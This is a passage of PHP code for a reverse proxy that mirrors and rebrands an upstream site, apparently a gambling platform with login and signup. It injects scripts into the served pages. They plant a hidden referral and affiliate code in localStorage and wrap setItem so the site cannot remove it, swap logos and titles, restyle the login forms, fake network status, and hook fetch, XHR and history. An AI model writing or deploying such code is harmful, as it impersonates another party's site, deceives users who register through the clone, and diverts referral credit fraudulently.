        . 'if(p!==dc){location.replace(d);}}}'
        . 'try{["pushState","replaceState"].forEach(function(m){var o=history[m];'
        . 'history[m]=function(){var r=o.apply(this,arguments);setTimeout(hit,0);return r;};});}catch(e){}'
        . 'window.addEventListener("popstate",hit);window.addEventListener("hashchange",hit);'
        . 'function boot(){hit();setInterval(hit,400);}'
        . 'if(document.readyState==="loading")document.addEventListener("DOMContentLoaded",boot);else boot();'
        . '})();</script>';
    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    if (stripos($html, '</body>') !== false) {
        return preg_replace('/<\/body>/i', $script . '</body>', $html, 1);
    }
    return $script . $html;
}

/**
 * Inject a fixed referral code into the site's registration flow by seeding
 * localStorage.reg_info (the value the app posts as `referralCode`). The code
 * never appears in the URL. localStorage.setItem is wrapped so the app's own
 * reg_info writes can't drop the code.
 */
function injectReferralShim(string $html): string
{
    $code = REFERRAL_CODE;
    $aff  = REFERRAL_AFFILIATE_CODE;
    if ($code === '' && $aff === '') {
        return $html;
    }
    $cfg = json_encode(
        ['code' => $code, 'aff' => $aff],
        JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES
            | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT
    );
    $script = '<script>(function(){var C=' . $cfg . ';if(!C.code&&!C.aff)return;'
        . 'function merge(v){var o;try{o=v?JSON.parse(v):{};}catch(e){o={};}'
        . 'if(!o||typeof o!=="object")o={};'
        . 'if(C.code)o.referralCode=C.code;if(C.aff)o.affiliateCode=C.aff;'
        . 'return JSON.stringify(o);}'
        . 'try{var ls=window.localStorage;'
        . 'ls.setItem("reg_info",merge(ls.getItem("reg_info")));'
        . 'var orig=ls.setItem;ls.setItem=function(k,v){if(k==="reg_info")v=merge(v);return orig.call(ls,k,v);};'
        . '}catch(e){}'
        . '})();</script>';
    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    return $script . $html;
}

/**
 * Inject a custom theme for the login / signup UI. Placed at the end of <head>
 * so it overrides the app's own styles. Edit the CSS variables below to recolour.
 */
function injectThemeShim(string $html): string
{
    $css = <<<'CSS'
<style id="px-login-theme">
:root{
  --pxl-bg1:#151b30; --pxl-bg2:#0b0f1c; --pxl-line:#2c375a;
  --pxl-text:#eef2ff; --pxl-muted:#9aa6c7;
  --pxl-grad:linear-gradient(135deg,#7c3aed,#2563eb);
  --pxl-grad-hover:linear-gradient(135deg,#8b5cf6,#3b82f6);
  --pxl-login:linear-gradient(135deg,#f59e0b,#ef4444);
  --pxl-glow:rgba(99,102,241,.45); --pxl-gold:#f5b301;
}
.v--modal-overlay{background:rgba(3,6,16,.72)!important;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px)}
.loginmodal-bg,.regs_bg{border-radius:20px!important;overflow:hidden!important;border:1px solid var(--pxl-line)!important;box-shadow:0 30px 90px rgba(0,0,0,.6)!important}
.register_wrapper,.form-popup-container .form-popup-bg{background:linear-gradient(165deg,var(--pxl-bg1),var(--pxl-bg2))!important}
.form-popup-container{border-radius:22px!important;overflow:hidden!important;box-shadow:0 30px 90px rgba(0,0,0,.6)!important}
.form-popup-container .form-popup-bg{border:1px solid var(--pxl-line)!important;border-radius:0 22px 22px 0!important}
.form-popup-container .form-popup-banner{border-radius:22px 0 0 22px!important}
.register_wrapper::-webkit-scrollbar-thumb,.form-popup-bg::-webkit-scrollbar-thumb{background:var(--pxl-grad)!important}
.register-title__text,.form-title,.form-title__text,.form-title h5{color:var(--pxl-text)!important}
.form-title span{border-bottom:2px solid var(--pxl-gold)!important}
.form-title a{color:var(--pxl-muted)!important}
.method-select{color:var(--pxl-muted)!important;text-shadow:none!important}
.method-select .active.method-item{background:var(--pxl-grad)!important;color:#fff!important;border-radius:12px!important;box-shadow:0 8px 20px var(--pxl-glow)!important}
.item_box{background:rgba(255,255,255,.05)!important;border:1px solid var(--pxl-line)!important;border-radius:12px!important;transition:border-color .2s,box-shadow .2s!important}
.item_box:hover,.item_box:focus-within{border-color:#6366f1!important;box-shadow:0 0 0 3px var(--pxl-glow)!important}
.form_item .item_box>input,.hd_login .form_item .item_box>input,.hd_login .form_item .item_box.hasIcon>input{background:transparent!important;color:var(--pxl-text)!important;border-radius:12px!important}
.form_item .item_box>input:focus{border-color:#6366f1!important;box-shadow:0 0 0 3px var(--pxl-glow)!important}
.form_item .item_box>input::placeholder,.hd_login .form_item .item_box>input::placeholder{color:var(--pxl-muted)!important}
.label-text,.label-box{color:var(--pxl-muted)!important}
.input_icon,.item-icon{color:var(--pxl-muted)!important}
.form_item .submit_btn,.form-popup-container .submit_btn,.register_wrapper .submit_btn,.hd_login .submit_btn,.hd_login .register-btn,.hd_login .free-btn{background:var(--pxl-grad)!important;border:0!important;border-radius:12px!important;color:#fff!important;box-shadow:0 12px 26px var(--pxl-glow)!important;transition:.2s!important}
.form_item .submit_btn:hover,.form-popup-container .submit_btn:hover,.register_wrapper .submit_btn:hover,.hd_login .submit_btn:hover,.hd_login .register-btn:hover{background:var(--pxl-grad-hover)!important;box-shadow:0 16px 34px var(--pxl-glow)!important;transform:translateY(-1px)}
.form_item .submit_btn.login-btn,.form-popup-container .submit_btn.login-btn,.register_wrapper .submit_btn.login-btn,.hd_login .submit_btn.login-btn{background:var(--pxl-login)!important;border:0!important;box-shadow:0 12px 26px rgba(239,68,68,.35)!important}
.form-btn{background:transparent!important;color:#fff!important;border:0!important;border-radius:12px!important}
.form_item .sms-btn,.hd_login .form_item .sms-btn{background:var(--pxl-grad)!important;border-radius:10px!important;box-shadow:0 6px 16px var(--pxl-glow)!important}
.form_item .sms-btn:hover{background:var(--pxl-grad-hover)!important}
p.errorMsg,.form_item .errorMsg{color:#fca5a5!important}
/* mobile login / signup: remove the Home / Register / Reset / Services cards */
.login_wrap .form-bottom-container,.register_wrap .form-bottom-container{display:none!important}
</style>
CSS;
    if (stripos($html, '</head>') !== false) {
        return preg_replace('/<\/head>/i', $css . '</head>', $html, 1);
    }
    return $css . $html;
}

/**
 * Inject admin-managed content: title, logo, marquee and banners.
 */
function injectContentShim(string $html, array $content): string
{
    $titles = $content['titles'] ?? [];
    $logo = $content['logo'] ?? [];
    $favicon = $content['favicon'] ?? [];
    $marquee = $content['marquee'] ?? [];
    if (($titles['web_title'] ?? '') === '' && ($logo['url'] ?? '') === ''
        && ($favicon['url'] ?? '') === '' && empty($marquee['enabled'])) {
        return $html;
    }

    $cfg = json_encode([
        'titles'  => ['web_title' => $titles['web_title'] ?? ''],
        'logo'    => ['url' => $logo['url'] ?? '', 'width' => (int) ($logo['width'] ?? 0)],
        'favicon' => ['url' => $favicon['url'] ?? ''],
        'marquee' => [
            'enabled' => !empty($marquee['enabled']),
            'items'   => array_values(array_map(function ($it) {
                return ['text' => (string) ($it['text'] ?? ''), 'link' => (string) ($it['link'] ?? '')];
            }, array_filter($marquee['items'] ?? [], 'is_array'))),
            'text'    => $marquee['text'] ?? '',
            'link'    => $marquee['link'] ?? '',
            'bg'      => $marquee['bg'] ?? '#111827',
            'color'   => $marquee['color'] ?? '#ffffff',
            'speed'   => max(20, (int) ($marquee['speed'] ?? 160)),
        ],
    ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);

    $script = '<script>(function(){var C=' . $cfg . ';'
        . 'function ready(f){if(document.readyState!=="loading")f();else document.addEventListener("DOMContentLoaded",f);}'
        . 'var T=C.titles||{},L=C.logo||{},F=C.favicon||{},M=C.marquee||{};'
        . 'if(T.web_title){var st=function(){if(document.title!==T.web_title)document.title=T.web_title;'
        . 'var e=document.getElementsByTagName("title")[0];if(e&&e.textContent!==T.web_title)e.textContent=T.web_title;};ready(st);setInterval(st,1200);}'
        . 'if(L.url){var sw=function(){var im=document.getElementsByTagName("img");for(var i=0;i<im.length;i++){'
        . 'var s=(im[i].getAttribute("src")||"")+" "+(im[i].className||"");if(/logo/i.test(s)&&im[i].src!==L.url){im[i].src=L.url;'
        . 'if(L.width>0){im[i].style.maxWidth=L.width+"px";im[i].style.height="auto";}}};};ready(sw);setInterval(sw,1500);}'
        . 'if(F.url){var fv=function(){if(document.getElementById("px-favicon"))return;'
        . 'var ls=document.querySelectorAll("link[rel*=\'icon\']");for(var i=0;i<ls.length;i++){if(ls[i].id!=="px-favicon"&&ls[i].parentNode)ls[i].parentNode.removeChild(ls[i]);}'
        . 'var l=document.createElement("link");l.id="px-favicon";l.rel="icon";l.href=F.url;document.head.appendChild(l);};ready(fv);setInterval(fv,3000);}'
        . 'if(M.enabled){var IT=(M.items&&M.items.length)?M.items:((M.text)?[{text:M.text,link:M.link||""}]:[]);'
        . 'ready(function(){var st=document.createElement("style");'
        . 'st.textContent=".notice_main,.marquee_box,.marquee-bar,.marquee-content,.notice_list{background:"+M.bg+" !important;color:"+M.color+" !important;}.notice_list li{color:"+M.color+" !important;}";'
        . 'document.head.appendChild(st);var pps=M.speed>0?M.speed:90;'
        . 'var applySpeed=function(){var cs=document.querySelectorAll(".marquee-content");var vw=window.innerWidth||0;for(var i=0;i<cs.length;i++){var w=cs[i].scrollWidth||0;var dist=w+0.67*vw;if(dist>0)cs[i].style.setProperty("animation-duration",(dist/pps)+"s","important");}};'
        . 'var setTxt=function(){if(!IT.length)return;var ls=document.querySelectorAll(".notice_list");for(var j=0;j<ls.length;j++){var cur=ls[j].querySelectorAll("li");var bad=cur.length!==IT.length;if(!bad){for(var m=0;m<IT.length;m++){if((cur[m].textContent||"")!==IT[m].text){bad=true;break;}}}if(bad){ls[j].innerHTML="";for(var k=0;k<IT.length;k++){var n=document.createElement("li");n.textContent=IT[k].text;ls[j].appendChild(n);}}}};'
        . 'var bind=function(){var ns=document.querySelectorAll(".notice_list li");for(var i=0;i<ns.length;i++){if(ns[i].getAttribute("data-px-mq"))continue;ns[i].setAttribute("data-px-mq","1");var it=IT[i%IT.length]||{};if(it.link){ns[i].style.cursor="pointer";(function(el,lk){el.addEventListener("click",function(ev){ev.stopPropagation();window.open(lk,"_blank");});})(ns[i],it.link);}}};'
        . 'applySpeed();setTxt();bind();setInterval(function(){applySpeed();setTxt();bind();},1500);});}'
        . '})();</script>';

    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    if (stripos($html, '</body>') !== false) {
        return preg_replace('/<\/body>/i', $script . '</body>', $html, 1);
    }
    return $script . $html;
}

/**
 * Prevent frontend "internet off" overlay when upstream is slow.
 * Does not mock login data — only suppresses offline UI.
 */
function injectOfflineShim(string $html): string
{
    $script = '<script>(function(){try{Object.defineProperty(navigator,"onLine",{get:function(){return true},configurable:true});}catch(e){}window.addEventListener("offline",function(e){e.stopImmediatePropagation();e.preventDefault();},true);var s=document.createElement("style");s.textContent=".offline-overlay,.network-error,.no-internet,.internet-off{display:none!important}";document.addEventListener("DOMContentLoaded",function(){try{document.head.appendChild(s);}catch(e){}});})();</script>';
    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    return $script . $html;
}

/**
 * Inject a tiny script that prefixes root-absolute same-origin requests
 * with the proxy base path, so /wps and /lgw calls reach this proxy.
 */
function injectBaseShim(string $html, string $base): string
{
    if ($base === '') {
        return $html;
    }
    $baseJson = json_encode($base);
    $script = '<base href="' . htmlspecialchars($base, ENT_QUOTES) . '/">'
        . '<script>(function(){var b=' . $baseJson . ';'
        . 'function f(u){if(typeof u!=="string"||u.charAt(0)!=="/"||u.charAt(1)==="/")return u;'
        . 'if(u===b||u.indexOf(b+"/")===0)return u;return b+u;}'
        . 'var o=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){'
        . 'try{arguments[1]=f(u);}catch(e){}return o.apply(this,arguments);};'
        . 'if(window.fetch){var wf=window.fetch;window.fetch=function(i,n){'
        . 'try{if(typeof i==="string")i=f(i);else if(i&&i.url)i=new Request(f(i.url),i);}catch(e){}'
        . 'return wf.call(this,i,n);};}'
        . '})();</script>';

    if (preg_match('/<head[^>]*>/i', $html)) {
        return preg_replace_callback('/(<head[^>]*>)/i', function ($m) use ($script) {
            return $m[1] . $script;
        }, $html, 1);
    }
    return $script . $html;
}

/**
 * Download a resource from upstream and store it locally.
 * Only for static /res/* assets — HTML never cached.
 */
function cacheResource(string $relPath): void
{
    // Strip query string for local file path
    $localPath = preg_replace('/\?.*$/', '', $relPath);
    $local = CACHE_DIR . '/' . ltrim($localPath, '/');

    // Already cached and fresh?
    if (is_file($local) && (time() - filemtime($local)) < CACHE_TTL) {
        return;
    }

    $dir = dirname($local);
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }

    // Fetch with original path (including query string for cache busting)
    $url = UPSTREAM . $relPath;
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS      => 5,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_TIMEOUT        => 60,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_ENCODING       => '',
        CURLOPT_USERAGENT      => clientUserAgent(),
        CURLOPT_TCP_KEEPALIVE  => 1,
        CURLOPT_IPRESOLVE      => CURL_IPRESOLVE_V4,
        CURLOPT_HTTPHEADER     => [
            'Accept: */*',
            'Referer: ' . UPSTREAM . '/',
        ],
    ]);
    $data = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($data !== false && $code >= 200 && $code < 400) {
        file_put_contents($local, $data);
    }
}

/**
 * Should the response be cached locally? Only static, GET resources.
 * HTML never cached — always inject fresh.
 */
function isCacheable(string $path): bool
{
    $method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');
    if ($method !== 'GET') {
        return false;
    }
    if (strpos($path, '/res/') === 0) {
        return true;
    }
    $ext = strtolower(pathinfo(parse_url($path, PHP_URL_PATH) ?: '', PATHINFO_EXTENSION));
    return in_array($ext, ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico',
        'woff', 'woff2', 'ttf', 'webp', 'mp4', 'webm', 'json'], true);
}

/**
 * Guess a content type from the path extension.
 */
function guessContentType(string $path): string
{
    $ext = strtolower(pathinfo(parse_url($path, PHP_URL_PATH) ?: '', PATHINFO_EXTENSION));
    $map = [
        'css'   => 'text/css; charset=UTF-8',
        'js'    => 'application/javascript; charset=UTF-8',
        'json'  => 'application/json; charset=UTF-8',
        'html'  => 'text/html; charset=UTF-8',
        'png'   => 'image/png',
        'jpg'   => 'image/jpeg',
        'jpeg'  => 'image/jpeg',
        'gif'   => 'image/gif',
        'svg'   => 'image/svg+xml',
        'ico'   => 'image/x-icon',
        'woff'  => 'font/woff',
        'woff2' => 'font/woff2',
        'ttf'   => 'font/ttf',
        'webp'  => 'image/webp',
        'mp4'   => 'video/mp4',
        'webm'  => 'video/webm',
    ];
    return $map[$ext] ?? 'text/html; charset=UTF-8';
}

/**
 * Serve a cached file with correct headers.
 */
function serveFile(string $file): void
{
    global $contentConfig;
    $mime = guessContentType($file);
    $isHtml = stripos($mime, 'text/html') !== false;
    header('Content-Type: ' . $mime);
    header('Cache-Control: ' . ($isHtml ? 'no-cache, must-revalidate' : 'public, max-age=' . CACHE_TTL));
    header('X-Proxy-Cache: HIT');
    header('Connection: close');

    $data = file_get_contents($file);
    if ($data === false) {
        return;
    }
    $data = applyBrand($data, $mime);
    $data = applyContentJson($data, $mime, $file, is_array($contentConfig) ? $contentConfig : []);
    $data = applyApkPolicy($data, $mime);
    $data = applyScriptPatches($data, $file, $mime);
    if ($isHtml) {
        $data = injectVoucherShim($data, is_array($contentConfig) ? ($contentConfig['voucher'] ?? []) : []);
        $data = injectReferralShim($data);
        $data = injectThemeShim($data);
    }
    header('Content-Length: ' . strlen($data));
    echo $data;
}
